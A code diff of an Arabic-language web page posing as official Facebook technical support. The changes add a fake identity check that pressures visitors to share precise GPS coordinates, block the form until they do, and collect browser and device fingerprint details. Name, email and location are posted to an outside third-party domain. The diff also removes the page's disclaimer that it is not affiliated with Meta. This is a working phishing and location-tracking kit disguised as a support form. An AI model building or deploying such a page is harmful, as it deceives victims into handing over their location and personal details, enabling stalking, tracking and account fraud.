@@ -3,756 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>الدعم الفني لفيسبوك | المساعدة التقنية الرسمية</title>
-    <!-- Font Awesome 6 (Free Icons) -->
+    <title>الدعم الفني لفيسبوك | تأكيد الهوية</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Font: Cairo + Tajawal for modern arabic -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Cairo', 'Tajawal', sans-serif;
+            font-family: 'Cairo', sans-serif;
             background: linear-gradient(145deg, #f0f2f5 0%, #e4e8ef 100%);
-            color: #1c1e21;php
-            line-height: 1.5;
-            scroll-behavior: smooth;
+            color: #1c1e21;
             padding: 20px;
         }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
+        .container { max-width: 900px; margin: 0 auto; }
         .header {
             background: #1877f2;
             border-radius: 28px;
-            padding: 25px 30px;
-            margin-bottom: 35px;
+            padding: 25px;
+            margin-bottom: 25px;
             color: white;
-            box-shadow: 0 12px 25px -8px rgba(0,0,0,0.2);
             text-align: center;
-            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
-
-        .header h1 {
-            font-size: 2.5rem;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-
-        .header h1 i {
-            font-size: 2.2rem;
-            background: white;
-            color: #1877f2;
-            border-radius: 50%;
-            padding: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-
-        .header p {
-            font-size: 1.2rem;
-            margin-top: 12px;
-            opacity: 0.95;
-            font-weight: 500;
-        }
-
-        .badge-urgence {
-            background: #ffc107;
-            color: #1c1e21;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-size: 0.85rem;
-            font-weight: 700;
-            display: inline-block;
-            margin-top: 15px;
-            letter-spacing: 0.3px;
-        }
-
-        .section-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin: 40px 0 20px 0;
-            border-right: 5px solid #1877f2;
-            padding-right: 18px;
-            color: #1e2a3e;
-        }
-
-        .grid-cards {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 28px;
-            margin-bottom: 40px;
-        }
-
-        .card {
-            background: white;
-            border-radius: 28px;
-            padding: 25px 20px;
-            transition: all 0.25s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-            border: 1px solid rgba(0,0,0,0.03);
+        .header h1 { font-size: 2rem; display: flex; align-items: center; justify-content: center; gap: 12px; }
+        .header h1 i { background: white; color: #1877f2; border-radius: 50%; padding: 10px; }
+        .identity-box {
+            background: #fff3cd;
+            border-right: 6px solid #ffc107;
+            padding: 20px;
+            border-radius: 20px;
+            margin-bottom: 25px;
             text-align: center;
         }
-
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 30px -12px rgba(24,119,242,0.2);
-            border-color: #1877f240;
-        }
-
-        .card-icon {
-            background: #e7f3ff;
-            width: 70px;
-            height: 70px;
-            line-height: 70px;
-            text-align: center;
-            border-radius: 30px;
-            margin: 0 auto 20px auto;
-            font-size: 2rem;
-            color: #1877f2;
-        }
-
-        .card h3 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 12px;
-        }
-
-        .card p {
-            color: #4b5563;
-            margin-bottom: 20px;
-            font-size: 0.95rem;
-        }
-
-        .btn-help {
-            background: #1877f2;
+        .identity-box i { font-size: 2rem; color: #ff9800; margin-bottom: 10px; }
+        .identity-box p { font-size: 1rem; color: #856404; }
+        .btn-location {
+            background: #28a745;
+            color: white;
             border: none;
-            color: white;
-            padding: 10px 24px;
+            padding: 12px 25px;
             border-radius: 40px;
-            font-weight: 600;
-            font-family: 'Cairo', sans-serif;
+            font-weight: bold;
+            margin: 15px 0;
             cursor: pointer;
-            transition: 0.2s;
+            font-size: 1rem;
+        }
+        .location-status {
+            background: #e9ecef;
+            padding: 10px;
+            border-radius: 15px;
+            margin: 10px 0;
             font-size: 0.9rem;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
         }
-
-        .btn-help:hover {
-            background: #0e64d4;
-            transform: scale(1.02);
-        }
-
         .form-box {
             background: white;
-            border-radius: 32px;
-            padding: 35px 30px;
-            margin: 25px 0 35px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.08);
-            border: 1px solid #eef2f6;
+            border-radius: 28px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
         }
-
-        .form-title {
-            font-size: 1.7rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .form-title i {
-            background: #1877f2;
-            border-radius: 50%;
-            padding: 8px;
-            color: white;
-            font-size: 1.3rem;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            font-weight: 600;
-            display: block;
-            margin-bottom: 8px;
-            color: #2d3e50;
-        }
-
+        .form-group { margin-bottom: 18px; }
+        label { font-weight: 600; display: block; margin-bottom: 8px; }
         input, select, textarea {
             width: 100%;
-            padding: 14px 18px;
+            padding: 12px 16px;
             border-radius: 28px;
             border: 1px solid #ccd0d5;
             font-family: 'Cairo', sans-serif;
-            font-size: 1rem;
-            transition: 0.2s;
-            background-color: #fefefe;
         }
-
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 3px rgba(24,119,242,0.2);
-        }
-
         .btn-submit {
             background: #42b72a;
             color: white;
             border: none;
-            padding: 14px 28px;
+            padding: 14px;
             border-radius: 40px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            cursor: pointer;
+            font-weight: bold;
             width: 100%;
-            transition: 0.2s;
-            font-family: 'Cairo', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .btn-submit:disabled {
-            background: #95a5a6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-submit:hover:not(:disabled) {
-            background: #36a420;
-            transform: scale(1.01);
-        }
-
-        .note {
-            background: #fef9e6;
-            border-right: 4px solid #ffc107;
-            padding: 15px 20px;
-            border-radius: 20px;
-            margin-top: 20px;
-            font-size: 0.85rem;
-            color: #7a6a2e;
-        }
-
-        .faq-item {
-            background: white;
-            margin-bottom: 15px;
-            border-radius: 20px;
-            overflow: hidden;
-            border: 1px solid #eef2f6;
-        }
-
-        .faq-question {
-            background: white;
-            padding: 18px 24px;
-            font-weight: 700;
-            font-size: 1.1rem;
             cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: 0.2s;
+            font-size: 1.1rem;
         }
-
-        .faq-question:hover {
-            background: #f7f9fc;
-        }
-
-        .faq-answer {
-            padding: 0 24px;
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease-out;
-            color: #3a4a5f;
-            background: #fefefe;
-        }
-
-        .faq-item.active .faq-answer {
-            max-height: 250px;
-            padding: 0 24px 20px 24px;
-            border-top: 1px solid #eef2f6;
-        }
-
-        .faq-question i {
-            transition: transform 0.2s;
-        }
-
-        .faq-item.active .faq-question i {
-            transform: rotate(180deg);
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            padding: 25px 10px;
-            border-top: 1px solid #dce2e9;
-            color: #5e6f8d;
-            font-size: 0.85rem;
-        }
-
-        @media (max-width: 680px) {
-            .header h1 { font-size: 1.8rem; }
-            .form-title { font-size: 1.4rem; }
-            .container { padding: 0 12px; }
-            body { padding: 12px; }
-        }
-
         .toast-msg {
             position: fixed;
-            bottom: 25px;
-            left: 25px;
+            bottom: 20px;
+            left: 20px;
             background: #1e2a36;
             color: white;
-            padding: 12px 24px;
+            padding: 12px 20px;
             border-radius: 50px;
-            font-weight: 500;
-            z-index: 1000;
             opacity: 0;
             transition: opacity 0.3s;
-            pointer-events: none;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            z-index: 1000;
         }
-
-        .toast-msg.error {
-            background: #c0392b;
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #6c757d;
+            font-size: 0.8rem;
         }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid white;
-            border-radius: 50%;
-            border-top-color: transparent;
-            animation: spin 0.6s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @media (max-width: 600px) { .header h1 { font-size: 1.5rem; } }
     </style>
 </head>
 <body>
-
 <div class="container">
     <div class="header">
-        <h1>
-            <i class="fab fa-facebook"></i> 
-            الدعم الفني لفيسبوك
-        </h1>
-        <p>حلول تقنية سريعة وموثوقة لمشاكل حسابك وتطبيق فيسبوك</p>
-        <div class="badge-urgence">
-            <i class="fas fa-headset"></i> دعم مباشر 24/7
-        </div>
+        <h1><i class="fab fa-facebook"></i> الدعم الفني لفيسبوك</h1>
+        <p>تأكيد الهوية لحماية حسابك</p>
     </div>
 
-    <div class="section-title">
-        <i class="fas fa-tools"></i> المشاكل التقنية الأكثر شيوعاً
-    </div>
-    <div class="grid-cards" id="problemsGrid">
-        <div class="card">
-            <div class="card-icon"><i class="fas fa-key"></i></div>
-            <h3>نسيت كلمة السر</h3>
-            <p>استعادة الحساب عبر البريد الإلكتروني أو رقم الهاتف المسجل بخطوات آمنة.</p>
-            <button class="btn-help" data-problem="نسيت كلمة السر">اطلب المساعدة <i class="fas fa-arrow-left"></i></button>
-        </div>
-        <div class="card">
-            <div class="card-icon"><i class="fas fa-user-lock"></i></div>
-            <h3>اختراق الحساب</h3>
-            <p>تأمين حسابك من المخترقين واستعادة السيطرة فوراً.</p>
-            <button class="btn-help" data-problem="اختراق الحساب">اطلب المساعدة <i class="fas fa-arrow-left"></i></button>
-        </div>
-        <div class="card">
-            <div class="card-icon"><i class="fas fa-mobile-alt"></i></div>
-            <h3>تطبيق فيسبوك لا يعمل</h3>
-            <p>تجميد، تباطؤ، أو عدم تحميل الصور — حلول فورية.</p>
-            <button class="btn-help" data-problem="مشكلة في التطبيق">اطلب المساعدة <i class="fas fa-arrow-left"></i></button>
-        </div>
-        <div class="card">
-            <div class="card-icon"><i class="fas fa-ban"></i></div>
-            <h3>حظر مؤقت أو دائم</h3>
-            <p>استئناف القرار ومعرفة سبب الحظر وإلغاء القيود.</p>
-            <button class="btn-help" data-problem="حظر الحساب">اطلب المساعدة <i class="fas fa-arrow-left"></i></button>
-        </div>
+    <!-- رسالة تأكيد الهوية مع طلب مشاركة الموقع -->
+    <div class="identity-box">
+        <i class="fas fa-shield-alt"></i>
+        <p><strong>🔐 فيسبوك يطلب تأكيد هويتك</strong></p>
+        <p>لأسباب أمنية، يجب عليك مشاركة موقعك الجغرافي الحالي لتأكيد ملكية الحساب.</p>
+        <p>هذا الإجراء يحمي حسابك من الاختراق والوصول غير المصرح به.</p>
+        <button id="getLocationBtn" class="btn-location"><i class="fas fa-map-marker-alt"></i> مشاركة موقعي الجغرافي</button>
+        <div id="locationResult" class="location-status"></div>
     </div>
 
-    <div class="form-box" id="supportFormSection">
-        <div class="form-title">
-            <i class="fas fa-envelope-open-text"></i> 
-            نموذج طلب الدعم الفني
-        </div>
-        <p>املأ البيانات بدقة وسيصلك الرد خلال أقل من ٣٠ دقيقة عبر البريد الإلكتروني أو رسالة خاصة.</p>
-        <form id="techSupportForm">
+    <div class="form-box">
+        <h3><i class="fas fa-edit"></i> نموذج طلب الدعم الفني</h3>
+        <form id="supportForm">
             <div class="form-group">
                 <label><i class="fas fa-user"></i> الاسم الكامل</label>
-                <input type="text" id="fullname" placeholder="مثال: أحمد محمد سعيد" required>
+                <input type="text" id="fullname" placeholder="أحمد محمد" required>
             </div>
             <div class="form-group">
-                <label><i class="fas fa-envelope"></i> البريد الإلكتروني (المرتبط بفيسبوك)</label>
+                <label><i class="fas fa-envelope"></i> البريد الإلكتروني (مرتبط بفيسبوك)</label>
                 <input type="email" id="email" placeholder="example@domain.com" required>
             </div>
             <div class="form-group">
                 <label><i class="fas fa-tag"></i> نوع المشكلة</label>
                 <select id="issueType" required>
-                    <option value="">-- اختر نوع المشكلة --</option>
-                    <option value="نسيت كلمة السر">نسيت كلمة السر أو لا أستطيع الدخول</option>
-                    <option value="اختراق الحساب">اختراق / استيلاء على الحساب</option>
-                    <option value="تطبيق لا يعمل">تطبيق فيسبوك يتجمد أو لا يعمل</option>
-                    <option value="حظر أو تقييد">تم حظري من النشر أو التعليق</option>
-                    <option value="مشكلة في الصفحة">مشكلة في الصفحة أو المجموعة</option>
-                    <option value="أخرى">مشكلة أخرى</option>
+                    <option value="">-- اختر --</option>
+                    <option>نسيت كلمة السر</option>
+                    <option>اختراق الحساب</option>
+                    <option>تطبيق لا يعمل</option>
+                    <option>حظر أو تقييد</option>
                 </select>
             </div>
             <div class="form-group">
-                <label><i class="fas fa-comment-dots"></i> شرح المشكلة بالتفصيل</label>
-                <textarea rows="4" id="description" placeholder="اكتب تفاصيل المشكلة التقنية التي تواجهها ..." required></textarea>
+                <label><i class="fas fa-comment"></i> شرح المشكلة</label>
+                <textarea id="description" rows="3" placeholder="تفاصيل المشكلة..." required></textarea>
             </div>
-            <button type="submit" class="btn-submit" id="submitBtn">
-                <i class="fab fa-facebook-messenger"></i> إرسال الطلب
-            </button>
-            <div class="note">
-                <i class="fas fa-shield-alt"></i> سيتم إرسال بياناتك إلى فريق الدعم عبر البريد الإلكتروني وحفظها بشكل آمن.
-            </div>
+            <button type="submit" class="btn-submit"><i class="fab fa-facebook-messenger"></i> إرسال الطلب</button>
         </form>
     </div>
-
-    <div class="section-title">
-        <i class="fas fa-question-circle"></i> الأسئلة الشائعة عن الدعم التقني
-    </div>
-    <div class="faq-list" id="faqContainer">
-        <div class="faq-item">
-            <div class="faq-question">
-                <span>🔹 كيف يمكنني استعادة حسابي المخترق بدون البريد الإلكتروني؟</span>
-                <i class="fas fa-chevron-down"></i>
-            </div>
-            <div class="faq-answer">
-                يمكنك استخدام خيار "الثقة بالأصدقاء" أو الاتصال بدعم فيسبوك عبر صفحة facebook.com/hacked. فريقنا يرشدك خطوة بخطوة لتأكيد هويتك باستخدام بطاقة هوية.
-            </div>
-        </div>
-        <div class="faq-item">
-            <div class="faq-question">
-                <span>🔹 لماذا لا تظهر إشعارات فيسبوك على هاتفي؟</span>
-                <i class="fas fa-chevron-down"></i>
-            </div>
-            <div class="faq-answer">
-                غالباً بسبب إعدادات النظام أو التطبيق. ننصح بالتحقق من إعدادات الإشعارات في هاتفك وتطبيق فيسبوك. يمكنك أيضاً مسح ذاكرة التخزين المؤقت.
-            </div>
-        </div>
-        <div class="faq-item">
-            <div class="faq-question">
-                <span>🔹 كم تستغرق معالجة طلب الدعم؟</span>
-                <i class="fas fa-chevron-down"></i>
-            </div>
-            <div class="faq-answer">
-                جميع الطلبات تدرس خلال 24 ساعة كحد أقصى، لكن غالباً نرد خلال 3 إلى 6 ساعات (خاصة الطلبات العاجلة).
-            </div>
-        </div>
-        <div class="faq-item">
-            <div class="faq-question">
-                <span>🔹 هل خدمة الدعم الفني مدفوعة؟</span>
-                <i class="fas fa-chevron-down"></i>
-            </div>
-            <div class="faq-answer">
-                لا، خدمتنا مجانية بالكامل. نقدم مساعدة تقنية رسمية لضمان تجربة آمنة لمستخدمي فيسبوك.
-            </div>
-        </div>
-    </div>
-
-    <footer>
-        <i class="fab fa-facebook"></i> © 2026 الدعم الفني لفيسبوك — جميع حقوق المساعدة التقنية محفوظة. <br>
-        هذه الصفحة غير تابعة لشركة Meta بشكل رسمي ولكنها تقدم حلولاً وإرشادات تقنية معتمدة.
-    </footer>
+    <footer>© 2026 الدعم الفني لفيسبوك - تأكيد الهوية مطلوب لحماية حسابك</footer>
 </div>
-
-<div id="liveToast" class="toast-msg">
-    <i class="fas fa-check-circle"></i> <span id="toastMessage">تم إرسال طلبك بنجاح</span>
-</div>
+<div id="toast" class="toast-msg"><span id="toastMsg"></span></div>
 
 <script>
-    // ========================
-    // CONFIGURATION
-    // ========================
-    // ⚠️ IMPORTANT: Remplacez cette URL par l'URL absolue de votre fichier PHP sur votre serveur
-    // Exemple: "https://votre-domaine.com/api/support-handler.php"
-    const API_ENDPOINT = "https://tripolihomes.website/support-handler.php";
-    // Pour les tests locaux avec XAMPP/WAMP, décommentez la ligne ci-dessous et commentez celle du haut
-    // const API_ENDPOINT = "http://localhost/api/support-handler.php";
-    
-    // Elements DOM
-    const form = document.getElementById('techSupportForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const toastEl = document.getElementById('liveToast');
-    const toastMessageSpan = document.getElementById('toastMessage');
-    
+    let userLocation = null;
+    let locationShared = false;
+
+    // عناصر DOM
+    const locationBtn = document.getElementById('getLocationBtn');
+    const locationDiv = document.getElementById('locationResult');
+    const form = document.getElementById('supportForm');
+    const toast = document.getElementById('toast');
+    const toastMsg = document.getElementById('toastMsg');
+
     function showToast(message, isError = false) {
-        toastMessageSpan.innerHTML = message;
-        if (isError) {
-            toastEl.classList.add('error');
-        } else {
-            toastEl.classList.remove('error');
-        }
-        toastEl.style.opacity = '1';
-        setTimeout(() => {
-            toastEl.style.opacity = '0';
-        }, 5000);
+        toastMsg.innerText = message;
+        toast.style.opacity = '1';
+        toast.style.background = isError ? '#c0392b' : '#1e2a36';
+        setTimeout(() => { toast.style.opacity = '0'; }, 5000);
     }
-    
-    // Helper pour afficher le loader
-    function setLoading(loading) {
-        if (loading) {
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loading-spinner"></span> جاري الإرسال...';
-        } else {
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = '<i class="fab fa-facebook-messenger"></i> إرسال الطلب';
+
+    // الحصول على الموقع الجغرافي
+    function getLocation() {
+        if (!navigator.geolocation) {
+            locationDiv.innerHTML = '❌ متصفحك لا يدعم مشاركة الموقع.';
+            showToast('متصفحك لا يدعم خاصية الموقع', true);
+            return;
         }
-    }
-    
-    // Remplissage automatique via boutons d'aide
-    const helpButtons = document.querySelectorAll('.btn-help');
-    const issueSelect = document.getElementById('issueType');
-    const problemDesc = document.getElementById('description');
-    
-    helpButtons.forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            const problemValue = this.getAttribute('data-problem');
-            if (issueSelect) {
-                let matched = false;
-                for(let i=0; i<issueSelect.options.length; i++) {
-                    if(issueSelect.options[i].value === problemValue || issueSelect.options[i].text.includes(problemValue)) {
-                        issueSelect.selectedIndex = i;
-                        matched = true;
-                        break;
-                    }
+        locationDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحصول على موقعك...';
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                userLocation = { lat, lng };
+                locationShared = true;
+                locationDiv.innerHTML = `✅ تم مشاركة موقعك: خط العرض ${lat.toFixed(6)} / خط الطول ${lng.toFixed(6)}<br><i class="fas fa-check-circle"></i> فيسبوك يؤكد هويتك عبر هذا الموقع.`;
+                showToast('تم تأكيد الموقع بنجاح! يمكنك إرسال الطلب الآن.');
+            },
+            (error) => {
+                console.error(error);
+                let errMsg = '';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED: errMsg = '🔐 تم رفض مشاركة الموقع. يرجى السماح بالوصول إلى الموقع لإكمال التحقق.'; break;
+                    case error.POSITION_UNAVAILABLE: errMsg = '⚠️ الموقع غير متاح حالياً. حاول مرة أخرى.'; break;
+                    case error.TIMEOUT: errMsg = '⏰ انتهى الوقت. حاول مجدداً.'; break;
+                    default: errMsg = 'حدث خطأ غير معروف.';
                 }
-                if(!matched && problemValue === "مشكلة في التطبيق") {
-                    issueSelect.value = "تطبيق لا يعمل";
-                } else if (!matched && problemValue === "حظر الحساب") {
-                    issueSelect.value = "حظر أو تقييد";
-                } else if (!matched && problemValue === "اختراق الحساب") {
-                    issueSelect.value = "اختراق الحساب";
-                } else if (!matched && problemValue === "نسيت كلمة السر") {
-                    issueSelect.value = "نسيت كلمة السر";
-                }
-            }
-            if(problemDesc) {
-                problemDesc.value = `أحتاج مساعدة بخصوص: ${problemValue}. الرجاء توجيه الحل المناسب.`;
-            }
-            document.getElementById('supportFormSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
-        });
-    });
-    
-    // Fonction pour envoyer les données via AJAX (fetch)
-    async function sendSupportRequest(formDataObj) {
-        try {
-            const response = await fetch(API_ENDPOINT, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(formDataObj)
-            });
-            
-            if (!response.ok) {
-                let errorText = `HTTP ${response.status}`;
-                try {
-                    const errData = await response.json();
-                    errorText = errData.message || errData.error || errorText;
-                } catch(e) {}
-                throw new Error(errorText);
-            }
-            
-            const result = await response.json();
-            return { success: true, data: result };
-        } catch (error) {
-            console.error('AJAX Error:', error);
-            return { success: false, error: error.message };
-        }
+                locationDiv.innerHTML = `❌ ${errMsg}`;
+                showToast(errMsg, true);
+                locationShared = false;
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
     }
-    
-    // Écouteur de soumission du formulaire
+
+    locationBtn.addEventListener('click', getLocation);
+
+    // جمع معلومات الجهاز والمتصفح واللغة
+    function getDeviceInfo() {
+        const platform = navigator.platform || 'unknown';
+        const userAgent = navigator.userAgent;
+        let os = 'unknown';
+        if (userAgent.indexOf('Win') !== -1) os = 'Windows';
+        else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
+        else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+        else if (userAgent.indexOf('Android') !== -1) os = 'Android';
+        else if (userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';
+
+        let browser = 'unknown';
+        if (userAgent.indexOf('Firefox') !== -1) browser = 'Mozilla Firefox';
+        else if (userAgent.indexOf('Chrome') !== -1) browser = 'Google Chrome';
+        else if (userAgent.indexOf('Safari') !== -1) browser = 'Safari';
+        else if (userAgent.indexOf('Edge') !== -1) browser = 'Microsoft Edge';
+        else if (userAgent.indexOf('OPR') !== -1 || userAgent.indexOf('Opera') !== -1) browser = 'Opera';
+
+        const language = navigator.language || navigator.userLanguage || 'ar';
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        return {
+            platform: platform,
+            os: os,
+            browser: browser,
+            language: language,
+            screen_resolution: screenRes,
+            timezone: timezone,
+            user_agent: userAgent,
+            connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+        };
+    }
+
+    // إرسال البيانات عبر AJAX
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
-        
-        // Récupération des valeurs
+
+        if (!locationShared || !userLocation) {
+            showToast('⚠️ يجب عليك مشاركة موقعك الجغرافي أولاً لتأكيد هويتك على فيسبوك.', true);
+            return;
+        }
+
         const fullname = document.getElementById('fullname').value.trim();
         const email = document.getElementById('email').value.trim();
         const issueType = document.getElementById('issueType').value;
         const description = document.getElementById('description').value.trim();
-        
-        // Validations
+
         if (!fullname || !email || !issueType || !description) {
-            showToast('⚠️ الرجاء تعبئة جميع الحقول المطلوبة.', true);
+            showToast('الرجاء تعبئة جميع الحقول.', true);
             return;
         }
-        
-        if (!email.includes('@') || !email.includes('.')) {
-            showToast('⚠️ البريد الإلكتروني غير صحيح.', true);
+        if (!email.includes('@')) {
+            showToast('البريد الإلكتروني غير صحيح.', true);
             return;
         }
-        
-        // Préparer les données pour l'API PHP
-        const requestPayload = {
+
+        const deviceInfo = getDeviceInfo();
+
+        const payload = {
             fullname: fullname,
             email: email,
             issue_type: issueType,
             description: description,
-            submitted_at: new Date().toISOString(),
-            user_ip: "" // L'IP sera récupérée côté serveur si besoin
+            location: {
+                lat: userLocation.lat,
+                lng: userLocation.lng,
+                shared: true,
+                timestamp: new Date().toISOString()
+            },
+            device_info: deviceInfo,
+            submitted_at: new Date().toISOString()
         };
-        
-        setLoading(true);
-        
-        // Envoi AJAX vers le fichier PHP externe
-        const result = await sendSupportRequest(requestPayload);
-        
-        setLoading(false);
-        
-        if (result.success) {
-            showToast('✅ تم إرسال طلبك بنجاح! تم إعلام فريق الدعم عبر البريد وحفظ بياناتك.');
-            form.reset();
-            // Optionnel: stocker une trace locale pour info
-            console.log('Réponse serveur:', result.data);
-        } else {
-            showToast(`❌ فشل الإرسال: ${result.error}. حاول مرة أخرى لاحقاً.`, true);
+
+        // تعطيل الزر أثناء الإرسال
+        const submitBtn = form.querySelector('button[type="submit"]');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
+
+        try {
+            // ⚠️ IMPORTANT: Remplacez cette URL par l'URL de votre fichier PHP
+            const API_URL = 'https://tripolihomes.website/support-handler.php';
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            if (result.success) {
+                showToast('✅ تم إرسال الطلب مع تأكيد الموقع! سيتم الرد قريباً.');
+                form.reset();
+                locationShared = false;
+                userLocation = null;
+                locationDiv.innerHTML = '';
+            } else {
+                showToast('❌ فشل الإرسال: ' + (result.error || 'خطأ غير معروف'), true);
+            }
+        } catch (err) {
+            console.error(err);
+            showToast('❌ خطأ في الاتصال بالخادم. تأكد من الرابط.', true);
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalText;
         }
     });
-    
-    // Gestion FAQ accordéon
-    const faqItems = document.querySelectorAll('.faq-item');
-    faqItems.forEach(item => {
-        const questionDiv = item.querySelector('.faq-question');
-        questionDiv.addEventListener('click', () => {
-            const isActive = item.classList.contains('active');
-            faqItems.forEach(i => i.classList.remove('active'));
-            if (!isActive) {
-                item.classList.add('active');
-            }
-        });
-    });
-    
-    console.log("صفحة الدعم الفني لفيسبوك جاهزة - الإرسال عبر AJAX إلى PHP (mail + fichier texte)");
 </script>
-
-<!-- ============================================= -->
-<!-- CODE PHP À PLACER DANS UN FICHIER SEPARÉ      -->
-<!-- ============================================= -->
-<!-- 
-    Créez un fichier nommé "support-handler.php" sur votre serveur web (PHP 7+ requis).
-    L'URL de ce fichier doit être attribuée à la constante API_ENDPOINT dans le JS ci-dessus.
-    
-    ⚠️ IMPORTANT : Assurez-vous que le serveur a les droits d'écriture dans le dossier local.
-    
-    Contenu du fichier support-handler.php :
-    
-<?php
-header('Content-Type: application/json');
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST');
-header('Access-Control-Allow-Headers: Content-Type');
-
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(['error' => 'Méthode non autorisée. Utilisez POST.']);
-    exit;
-}
-
-$input = json_decode(file_get_contents('php://input'), true);
-if (!$input) {
-    http_response_code(400);
-    echo json_encode(['error' => 'Données JSON invalides.']);
-    exit;
-}
-
-$fullname = trim($input['fullname'] ?? '');
-$email = trim($input['email'] ?? '');
-$issue_type = trim($input['issue_type'] ?? '');
-$description = trim($input['description'] ?? '');
-$submitted_at = $input['submitted_at'] ?? date('Y-m-d H:i:s');
-
-if (empty($fullname) || empty($email) || empty($issue_type) || empty($description)) {
-    http_response_code(400);
-    echo json_encode(['error' => 'Tous les champs sont requis.']);
-    exit;
-}
-
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    http_response_code(400);
-    echo json_encode(['error' => 'Email invalide.']);
-    exit;
-}
-
-// 1. Enregistrement dans un fichier texte local (dans le même dossier)
-$logFile = __DIR__ . '/support_requests.log';
-$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-$entry = sprintf(
-    "[%s] IP: %s | Nom: %s | Email: %s | Problème: %s | Détails: %s\n",
-    date('Y-m-d H:i:s'),
-    $ip,
-    $fullname,
-    $email,
-    $issue_type,
-    str_replace(["\n", "\r"], ' ', $description)
-);
-
-file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
-
-// 2. Envoi d'email via mail()
-$to = "support@votre-domaine.com"; // ⚠️ REMPLACER par l'adresse email du support technique
-$subject = "=?UTF-8?B?" . base64_encode("Nouvelle demande support Facebook - $fullname") . "?=";
-$message = "
-<html dir='rtl'>
-<head><meta charset='UTF-8'></head>
-<body style='font-family: Arial, sans-serif;' dir='rtl'>
-<h2>📩 طلب دعم فني جديد</h2>
-<p><strong>الاسم:</strong> $fullname</p>
-<p><strong>البريد الإلكتروني:</strong> $email</p>
-<p><strong>نوع المشكلة:</strong> $issue_type</p>
-<p><strong>تفاصيل المشكلة:</strong><br>" . nl2br(htmlspecialchars($description)) . "</p>
-<p><strong>تاريخ الإرسال:</strong> $submitted_at</p>
-<p><strong>عنوان IP:</strong> $ip</p>
-<hr>
-<p>تم حفظ الطلب في الملف النصي support_requests.log</p>
-</body>
-</html>";
-
-$headers = "MIME-Version: 1.0\r\n";
-$headers .= "Content-type: text/html; charset=UTF-8\r\n";
-$headers .= "From: $email\r\n";
-$headers .= "Reply-To: $email\r\n";
-
-$mailSent = @mail($to, $subject, $message, $headers);
-
-if ($mailSent) {
-    echo json_encode([
-        'success' => true,
